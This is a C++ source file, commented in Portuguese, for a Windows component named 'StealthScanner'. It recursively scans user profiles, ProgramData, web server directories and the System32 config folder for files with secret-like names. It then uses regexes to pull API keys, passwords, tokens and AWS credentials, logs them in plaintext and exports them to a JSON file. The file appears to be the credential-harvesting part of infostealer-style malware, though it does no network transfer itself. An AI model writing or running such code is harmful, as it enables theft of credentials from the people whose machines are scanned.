// ======================================================================
// stealth_scanner.cpp – Varredura de arquivos sensíveis
// ======================================================================

#include "stealth_scanner.h"
#include "../utils/logger.h"
#include <fstream>
#include <regex>
#include <sstream>
#include <string>
#include <vector>
#include <set>
#include <algorithm>
#include <cctype>
#include <windows.h>

// ======================================================================
// IMPLEMENTAÇÃO
// ======================================================================

bool StealthScanner::Initialize()
{
    LOG_INFO(L"StealthScanner inicializado");
    return true;
}

bool StealthScanner::IsSensitiveFile(const std::wstring& name)
{
    static const wchar_t* patterns[] = {
        L"*.env", L"*.config", L"*.json", L"*.xml", L"*.ini",
        L"*secret*", L"*credential*", L"*password*", L"*token*",
        L"*key*", L"*private*", L"*identity*"
    };
    std::wstring lower = name;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    for (auto pat : patterns)
    {
        std::wstring p = pat;
        std::transform(p.begin(), p.end(), p.begin(), ::towlower);
        if (p.find(L'*') != std::wstring::npos)
        {
            std::wstring base = p.substr(0, p.find(L'*'));
            if (lower.find(base) != std::wstring::npos) return true;
        }
        else if (lower == p) return true;
    }
    return false;
}

void StealthScanner::ExtractFromFile(const std::wstring& path)
{
    std::wifstream file(path);
    if (!file.is_open()) return;

    std::wstring content((std::istreambuf_iterator<wchar_t>(file)), std::istreambuf_iterator<wchar_t>());
    if (content.empty()) return;

    // Regex SEM (?i) - usamos a flag std::regex::icase
    std::wregex patterns[] = {
        std::wregex(L"(api[_-]?key|secret|token|password|credential|private[_-]?key)\\s*[=:]\\s*([^\\s;]+)", std::regex::icase),
        std::wregex(L"(aws[_-]?access[_-]?key|aws[_-]?secret[_-]?key|aws[_-]?session[_-]?token)\\s*[=:]\\s*([^\\s;]+)", std::regex::icase)
    };

    for (auto& re : patterns)
    {
        std::wsmatch match;
        std::wstring::const_iterator start = content.cbegin();
        while (std::regex_search(start, content.cend(), match, re))
        {
            if (match.size() >= 3)
            {
                FoundCredential cred;
                cred.filePath = path;
                cred.key = match[1].str();
                cred.value = match[2].str();
                m_credentials.push_back(cred);
                m_credentialsFound++;
                LOG_DEBUG(L"Credencial: %ls = %ls", cred.key.c_str(), cred.value.c_str());
            }
            start = match[0].second;
        }
    }
}

// ======================================================================
// Varredura de diretório (versão simplificada com FindFirstFile)
// ======================================================================
bool StealthScanner::ScanDirectoryNt(const std::wstring& path)
{
    WIN32_FIND_DATAW fd;
    std::wstring searchPath = path + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring full = path + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT))
                ScanDirectory(full);
        }
        else
        {
            m_filesScanned++;
            if (IsSensitiveFile(full))
                ExtractFromFile(full);
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return true;
}

void StealthScanner::ScanDirectory(const std::wstring& path)
{
    if (m_scannedDirs.count(path)) return;
    m_scannedDirs.insert(path);

    ScanDirectoryNt(path);
}

void StealthScanner::ScanSensitiveData()
{
    std::vector<std::wstring> dirs = {
        L"C:\\Users",
        L"C:\\ProgramData",
        L"C:\\inetpub",
        L"C:\\xampp",
        L"C:\\wamp",
        L"C:\\Windows\\System32\\config",
        L".\\"
    };
    for (const auto& d : dirs)
    {
        DWORD attrs = GetFileAttributesW(d.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY))
            ScanDirectory(d);
    }
}

bool StealthScanner::ExportResults(const std::wstring& filePath)
{
    std::wofstream out(filePath);
    if (!out.is_open()) return false;
    out << L"{\n  \"credentials\": [\n";
    for (size_t i = 0; i < m_credentials.size(); i++)
    {
        out << L"    { \"file\": \"" << m_credentials[i].filePath << L"\", "
            << L"\"key\": \"" << m_credentials[i].key << L"\", "
            << L"\"value\": \"" << m_credentials[i].value << L"\" }";
        if (i + 1 < m_credentials.size()) out << L",";
        out << L"\n";
    }
    out << L"  ]\n}\n";
    out.close();
    LOG_INFO(L"Resultados exportados para %ls (%zu credenciais)", filePath.c_str(), m_credentials.size());
    return true;
}